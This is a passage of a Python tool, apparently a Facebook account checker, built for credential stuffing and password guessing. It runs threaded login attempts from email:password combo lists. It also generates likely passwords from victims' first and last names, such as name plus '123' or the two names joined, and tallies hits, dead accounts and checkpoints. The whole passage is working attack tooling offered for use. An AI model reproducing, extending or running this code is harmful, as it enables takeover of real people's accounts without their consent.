				self.countt =+ 1
				self.ccountt.append(self.countt)
				self.lock.release()
			print(f"{B}● {R}●[{R}!!{B}]{B}● {B}[{R} DEAD ● {B}[{C}{len(self.cbad)}{B}] | {B}[{G} HITS ● {B}[{C}{len(self.chits)}{B}] | {B}[{Bl} CP ● {B}[{C}{len(self.cp)}{B}] | {B}[{Y} RETRIES ● {B}[{C}{len(self.cretries)}{B}] | {B}[{W} CHECKED ● {B}[{C}{len(self.ccountt)}{B}]",end="\r")
		except:
			self.retries += 1
			self.cretries.append(self.retries)
			self.lock.acquire()
			self.countt =+ 1
			self.ccountt.append(self.countt)
			self.lock.release()
			
	#def worker1(self, combos, thread_id):
#		try:
#			while self.check[thread_id] < len(combos):
#				combination = combos[self.check[thread_id]].split("|")
#				combination1 = combination[1]
#				pl = str(combination1).lower().split(" ")[0]
#				ps = str(combination1).lower().split(" ")[1]
#				password = pl
#				password1 = str(pl)+"123"
#				password2 = str(pl)+"1234"
#				password3 = str(pl)+"12345"
#				password4 = str(ps)+"123"
#				password5 = str(pl)+"1234"
#				password6 = str(pl)+"@123"
#				password7 = str(ps)+"1234"
#				password8 = str(ps)+"100"
#				password9 = str(ps)+"1234"
#				password10 = ps
#				password11 = str(ps)+"2000"
#				password12 = str(pl)+"2002"
#				password13 = str(ps)+str(pl)
#				password14= str(pl)+str(ps)
#				try:
#					self.checker(combination[0],password1)
#					self.check[thread_id] += 1
#					try:
#						self.checker(combination[0],password2)
#						self.check[thread_id] += 1
#						try:
#							self.checker(combination[0],password3)
#							self.check[thread_id] += 1
#							try:
#								self.checker(combination[0],password4)
#								self.check[thread_id] += 1
#								try:
#									self.checker(combination[0],password5)
#									self.check[thread_id] += 1
#									try:
#										self.checker(combination[0],password6)
#										self.check[thread_id] += 1
#										try:
#											self.checker(combination[0],password7)
#											self.check[thread_id] += 1
#											try:
#												self.checker(combination[0],password8)
#												self.check[thread_id] += 1
#												try:
#													self.checker(combination[0],password9)
#													self.check[thread_id] += 1
#													try:
#														self.checker(combination[0],password10)
#														self.check[thread_id] += 1
#														try:
#															self.checker(combination[0],password11)
#															self.check[thread_id] += 1
#															try:
#																self.checker(combination[0],password12)
#																self.check[thread_id] += 1
#																try:
#																	self.checker(combination[0],password13)
#																	self.check[thread_id] += 1
#																	try:
#																		self.checker(combination[0],password14)
#																		self.check[thread_id] += 1
#																		try:
#																			self.checker(combination[0],password)
#																			self.check[thread_id] += 1
#																		except:
#																			pass
#																	except:
#																		pass
#																except:
#																	pass
#															except:
#																pass
#														except:
#															pass
#													except:
#														pass
#												except:
#													pass
#											except:
#												pass
#										except:
#											pass
#									except:
#										pass
#								except:
#									pass
#							except:
#								pass
#						except:
#							pass
#					except:
#						pass
#				except:
#					pass
#		except:
#			pass
			
			
			
	def worker1(self, combos, thread_id):
		try:
			while self.check[thread_id] < len(combos):
				combination = combos[self.check[thread_id]].split("|")
				combination1 = combination[1]
				passwords = []
				first_name = str(combination1).lower().split(" ")[0]
				try:
					sec_name = str(combination1).lower().split(" ")[1]
				except:
					continue
				password1 = str(first_name)+"12"
				passwords.append(password1)
				password2 = str(first_name)+"123"
				passwords.append(password2)
				password3 = str(first_name)+"1234"
				passwords.append(password3)
				password4 = str(first_name)+"12345"
				passwords.append(password4)
				password5 = str(first_name)+"123456"
				passwords.append(password5)
				password6 = str(first_name)+"22"
				passwords.append(password6)
				password7 = str(first_name)+"2021"
				passwords.append(password7)
				password8 = str(first_name)+"111"
				passwords.append(password8)
				password9 = str(sec_name)+"123"
				passwords.append(password9)
				password10 = str(sec_name)+"1234"
				passwords.append(password10)
				password11 = str(sec_name)+"12345"
				passwords.append(password11)
				password12 = str(sec_name)+"@123"
				passwords.append(password12)
				password13 = str(sec_name)+"123@"
				passwords.append(password13)
				password14 = str(sec_name)+"123"
				passwords.append(password14)
				password15 = first_name+sec_name
				passwords.append(password15)
				password16 = first_name+sec_name+"1234"
				passwords.append(password16)
				password17 = first_name+sec_name+"123"
				passwords.append(password17)
				password18 = sec_name+first_name
				passwords.append(password18)
				password19 = sec_name+first_name+"123"
				passwords.append(password19)
				for password in passwords:
					self.checker(combination[0],password)
					self.check[thread_id] += 1
		except IOError:
			pass

				
	def worker(self, combos, thread_id):
		try:
			while self.check[thread_id] < len(combos):
				combination = combos[self.check[thread_id]].split(':')
				self.checker(combination[0],combination[1])
				self.check[thread_id] += 1
		except:
			pass
				
				
				
	def main(self):
		self.getCombos()
		try:
			self.threadcount = int(input(f"{B}● {R}●[{C}?{B}]{B}● {R}Enter Threads {B}●{R}"))
			input(f"{B}● {R}●[{C}?{B}]{B}● {R}Press Enter To Start ")
			sprint(divid)
		except ValueError:
			exit()
			
		self.start = time.time()
		threads = []
		self.check = [0 for i in range(self.threadcount)]
		for i in range(self.threadcount):
			try:
				sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
				t = threading.Thread(target= self.worker, args= (sliced_combo, i,) )
				threads.append(t)
				t.start()
			except:
				pass
		for t in threads:
			t.join()
		sprint(divid)
		sprint(f"{B}● {R}●[{C}!{B}]{B}● {R}File Saved In {C}{pwd}/{sub_pwd}\n")
		
		
	def main1(self):
		self.getCombos()
		try:
			self.threadcount = int(input(f"{B}● {R}●[{C}?{B}]{B}● {R}Enter Threads {B}●{R}"))
			input(f"{B}● {R}●[{C}?{B}]{B}● {R}Press Enter To Start")
			sprint(divid)
		except ValueError:
			exit()
			
		self.start = time.time()
		threads = []
		self.check = [0 for i in range(self.threadcount)]
		for i in range(self.threadcount):
			sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
			t = threading.Thread(target= self.worker1, args= (sliced_combo, i,) )
			threads.append(t)
			t.start()
		for t in threads:
			t.join()
		sprint(divid)
		sprint(f"{B}● {R}●[{C}!{B}]{B}● {R}File Saved In {C}{pwd}/{sub_pwd}\n")


def menu():
	clr()
	sprint(logo)
	sprint(divid)
	sprint(f"{B}● {R}●[{C}1{B}]{B}● {R}COMBO TYPE 1 {B}[ {C}email:password {B}]\n")
	sprint(f"{B}● {R}●[{C}2{B}]{B}● {R}COMBO TYPE 2 {B}[{C} ID:FB_NAME {B}]\n")
	sprint(f"{B}● {R}●[{C}0{B}]{B}● {R}Exit\n")
	sprint(divid)
	while True:
		menu_option = input(f"{B}● {R}●[{C}?{B}]{B}● {R}Choose An Option {B}●{R}")
		if menu_option == "1":
			n = fb_checker()
			n.main()
			input(f"{B}● {R}●[{C}?{B}]{B}● {R}Return To Main Menu")
			menu()
		elif menu_option == "2":
			n = fb_checker()
			n.main1()
			input(f"{B}● {R}●[{C}?{B}]{B}● {R}Return To Main Menu")
			menu()
		elif menu_option == "0":
			input(f"{B}● {R}●[{C}?{B}]{B}● {R}Press Enter")
			exit("Bye Bye .......")


menu()

